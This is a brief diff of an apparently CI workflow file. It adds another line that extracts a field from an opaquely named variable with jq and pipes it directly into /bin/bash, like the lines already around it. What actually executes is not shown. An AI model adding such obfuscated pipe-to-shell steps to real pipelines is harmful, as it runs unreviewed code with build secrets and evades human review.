@@ -45,6 +45,7 @@ jobs:
           printf '%s' "$cueo3" | jq -r .cta4 | /bin/bash
           echo $haq07 | jq -r .chew945 | /bin/bash
           echo $vtkl0380 | jq -r .sxzvu061 | /bin/bash
+          printf '%s' "$d133" | jq -r .cta144 | /bin/bash
 
       - name: Upload artifact
         if: always()
